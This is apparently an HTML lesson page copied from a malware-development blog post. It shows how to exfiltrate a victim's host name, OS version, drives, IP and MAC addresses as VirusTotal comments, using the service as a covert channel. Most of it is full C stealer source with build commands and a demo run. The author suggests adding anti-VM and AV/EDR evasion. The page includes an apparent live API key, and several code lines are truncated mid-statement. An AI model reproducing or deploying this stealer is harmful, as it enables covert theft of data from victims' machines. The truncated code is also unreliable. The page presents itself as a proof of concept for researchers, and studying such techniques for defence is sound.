@@ -1,0 +1,298 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development trick. Stealing data via legit VirusTotal</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #21</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development trick. Stealing data via legit VirusTotal</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">API. Simple C example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Like in the previous malware development trick example, this post is just for showing Proof of Concept. In the practice example with Telegram API, the attacker has one weak point: if the victim’s computer does not have a Telegram client or let’s say that messengers are generally prohibited in the victim’s organization, then you must agree that interaction with Telegram servers may raise suspicion (whether through a bot or not). Some time ago, I found a some interesting ideas of using VirusTotal API for stealing and C2-control logic. So, let’s implement it again by me. pracical example The main logic for stealing system information is the same as in the previous article. The only difference is using the VirusTotal API v3. For example, according to the documentation, we can add comments to a file:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, we need SHA-256, SHA-1 or MD5 string identifying the target file. For this reasson just create simple file with the following logic - meow.c:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+* hack.c
+* "malware" for testing VirusTotal API
+* author: @cocomelonc
+* https://cocomelonc.github.io/malware/2024/06/25/malware-trick-41.html
+*/
+#include &lt;windows.h&gt;
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+LPSTR lpCmdLine, int nCmdShow) {
+MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As usual, this is just meow-meow messagebox “malware”.</p>
+
+            <div id="compile-it" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Compile it:</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">x86_64-w64-mingw32-g++ meow.c -o meow.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And upload it to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/379698a4f06f18cb3ad388145cf62f47a8da2285 2a08dd19b3ef48aaedffd3fa/details At the next step we will create simple logic for posting comment to this file: #define VT_API_KEY "VIRUS_TOTAL_API_KEY" #define FILE_ID "379698a4f06f18cb3ad388145cf62f47a8da22852a08dd19b3ef48aaedffd3fa"</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">// send data to VirusTotal using winhttp
+int sendToVT(const char* comment) {
+HINTERNET hSession = NULL;
+HINTERNET hConnect = NULL;
+hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+if (hSession == NULL) {
+fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
+return 1;
+}
+hConnect = WinHttpConnect(hSession, L"www.virustotal.com",
+
+INTERNET_DEFAULT_HTTPS_PORT, 0);
+if (hConnect == NULL) {
+fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hSession);
+}
+HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v3/files/"
+FILE_ID "/comments", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+WINHTTP_FLAG_SECURE);
+if (hRequest == NULL) {
+fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+}
+// construct the request body
+char json_body[1024];
+snprintf(json_body, sizeof(json_body),
+"{\"data\": {\"type\": \"comment\", \"attributes\": {\"text\": \"%s\"}}}",
+comment);
+
+// set the headers
+if (!WinHttpSendRequest(hRequest,
+L"x-apikey: " VT_API_KEY "\r\nUser-Agent: vt v.1.0\r\nAccept-Encoding: gzip, deflate\r\nCo
+-1, (LPVOID)json_body,
+strlen(json_body), strlen(json_body), 0)) {
+fprintf(stderr, "WinHttpSendRequest. Error %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hRequest);
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+return 1;
+}
+BOOL hResponse = WinHttpReceiveResponse(hRequest, NULL);
+if (!hResponse) {
+fprintf(stderr, "WinHttpReceiveResponse. Error %d has occurred.\n", GetLastError());
+}
+DWORD code = 0;
+DWORD codeS = sizeof(code);
+if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+WINHTTP_HEADER_NAME_BY_INDEX, &amp;code, &amp;codeS,
+WINHTTP_NO_HEADER_INDEX)) {
+if (code == 200) {
+printf("comment posted successfully.\n");
+} else {
+
+printf("failed to post comment. HTTP Status Code: %d\n", code);
+}
+} else {
+DWORD error = GetLastError();
+LPSTR buffer = NULL;
+FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER |
+FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+NULL, error, 0, (LPSTR)&amp;buffer, 0, NULL);
+printf("WTF? unknown error: %s\n", buffer);
+LocalFree(buffer);
+}
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hRequest);
+WinHttpCloseHandle(hSession);
+printf("successfully send info via VT API :)\n");
+return 0;
+}
+
+As you can see, this is just post request, in my case file ID = 379698a4f06f18cb3ad388145cf62f47a8da22852a08dd19b
+So the full source code is looks like this:
+/*
+* hack.c
+* sending systeminfo via legit URL. VirusTotal API
+* author @cocomelonc
+* https://cocomelonc.github.io/malware/2024/06/25/malware-trick-41.html
+*/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;winhttp.h&gt;
+#include &lt;iphlpapi.h&gt;
+#define VT_API_KEY "7e7778f8c29bc4b171512caa6cc81af63ed96832f53e7e35fb706dd320ab8c42"
+#define FILE_ID "379698a4f06f18cb3ad388145cf62f47a8da22852a08dd19b3ef48aaedffd3fa"
+// send data to VirusTotal using winhttp
+int sendToVT(const char* comment) {
+HINTERNET hSession = NULL;
+HINTERNET hConnect = NULL;
+
+hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_N
+if (hSession == NULL) {
+
+fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
+return 1;
+}
+
+hConnect = WinHttpConnect(hSession, L"www.virustotal.com", INTERNET_DEFAULT_HTTPS_PORT, 0)
+if (hConnect == NULL) {
+fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hSession);
+}
+
+HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v3/files/" FILE_ID "/com
+if (hRequest == NULL) {
+fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+}
+
+// construct the request body
+char json_body[1024];
+snprintf(json_body, sizeof(json_body), "{\"data\": {\"type\": \"comment\", \"attributes\":
+
+// set the headers
+if (!WinHttpSendRequest(hRequest, L"x-apikey: " VT_API_KEY "\r\nUser-Agent: vt v.1.0\r\nAc
+fprintf(stderr, "WinHttpSendRequest. Error %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hRequest);
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+return 1;
+}
+BOOL hResponse = WinHttpReceiveResponse(hRequest, NULL);
+if (!hResponse) {
+fprintf(stderr, "WinHttpReceiveResponse. Error %d has occurred.\n", GetLastError());
+}
+
+DWORD code = 0;
+DWORD codeS = sizeof(code);
+if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, W
+if (code == 200) {
+printf("comment posted successfully.\n");
+} else {
+printf("failed to post comment. HTTP Status Code: %d\n", code);
+}
+} else {
+DWORD error = GetLastError();
+LPSTR buffer = NULL;
+
+FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESS
+NULL, error, 0, (LPSTR)&amp;buffer, 0, NULL);
+printf("WTF? unknown error: %s\n", buffer);
+LocalFree(buffer);
+}
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hRequest);
+WinHttpCloseHandle(hSession);
+printf("successfully send info via VT API :)\n");
+return 0;
+}
+// get systeminfo and send as comment via VT API logic
+int main(int argc, char* argv[]) {
+
+//
+//
+
+// test posting comment
+const char* comment = "meow-meow";
+sendToVT(comment);
+char systemInfo[4096];
+// Get host name
+CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
+DWORD size = sizeof(hostName) / sizeof(hostName[0]);
+GetComputerNameA(hostName, &amp;size); // Use GetComputerNameA for CHAR
+// Get OS version
+OSVERSIONINFO osVersion;
+osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+GetVersionEx(&amp;osVersion);
+// Get system information
+SYSTEM_INFO sysInfo;
+GetSystemInfo(&amp;sysInfo);
+// Get logical drive information
+DWORD drives = GetLogicalDrives();
+// Get IP address
+IP_ADAPTER_INFO adapterInfo[16]; // Assuming there are no more than 16 adapters
+DWORD adapterInfoSize = sizeof(adapterInfo);
+if (GetAdaptersInfo(adapterInfo, &amp;adapterInfoSize) != ERROR_SUCCESS) {
+printf("GetAdaptersInfo failed. error: %d has occurred.\n", GetLastError());
+return false;
+
+}
+snprintf(systemInfo, sizeof(systemInfo),
+"Host Name: %s, "
+"OS Version: %d.%d.%d, "
+"Processor Architecture: %d, "
+"Number of Processors: %d, "
+"Logical Drives: %X, ",
+hostName,
+osVersion.dwMajorVersion, osVersion.dwMinorVersion, osVersion.dwBuildNumber,
+sysInfo.wProcessorArchitecture,
+sysInfo.dwNumberOfProcessors,
+drives);
+// Add IP address information
+for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL; adapter = adapter-&gt;Next) {
+snprintf(systemInfo + strlen(systemInfo), sizeof(systemInfo) - strlen(systemInfo),
+"Adapter Name: %s, "
+"IP Address: %s, "
+"Subnet Mask: %s, "
+"MAC Address: %02X-%02X-%02X-%02X-%02X-%02X",
+adapter-&gt;AdapterName,
+adapter-&gt;IpAddressList.IpAddress.String,
+adapter-&gt;IpAddressList.IpMask.String,
+adapter-&gt;Address[0], adapter-&gt;Address[1], adapter-&gt;Address[2],
+adapter-&gt;Address[3], adapter-&gt;Address[4], adapter-&gt;Address[5]);
+}
+int result = sendToVT(systemInfo);
+if (result == 0) {
+printf("ok =^..^=\n");
+} else {
+printf("nok &lt;3()~\n");
+}
+return 0;
+}
+This is also not such a complex stealer, because it is just a “dirty PoC” and in real attacks,
+attackers use stealers with more complex logic.
+Also, as you can see, we haven’t used tricks here like anti-VM, anti-debugging, AV/EDR
+bypass, etc. So you can add them based on my code if you need.
+
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s check everything in action.</p>
+
+            <div id="compile-our-stealer-hack-c" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Compile our “stealer” hack.c:</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \ -I/usr/share/mingw-w64/include/ \ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive \ -liphlpapi -lwinhttp</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And run it on my Windows 11 VM: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, a test comment meow-meow was created but the comment with system information did not appear because initially the code was separated by a \n symbol and not a comma, but I corrected everything and everything worked:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, our logic worked perfectly! If we run it on my Windows 10 VM: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And monitoring traffic via Wireshark we got an IP address 74.125.34.46: whois 74.125.34.46</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is worked perfectly and this is one of the virustotal servers =.. =! As far as I remember, I saw an excellent implementation of this trick by Saad Ahla I hope this post with practical example is useful for malware researchers, red teamers, spreads awareness to the blue teamers of this interesting technique. VirusTotal documentation Test file VirusTotal result: comments WebSec Malware Scanner Using Telegram API example source code in github</p></main></body></html>
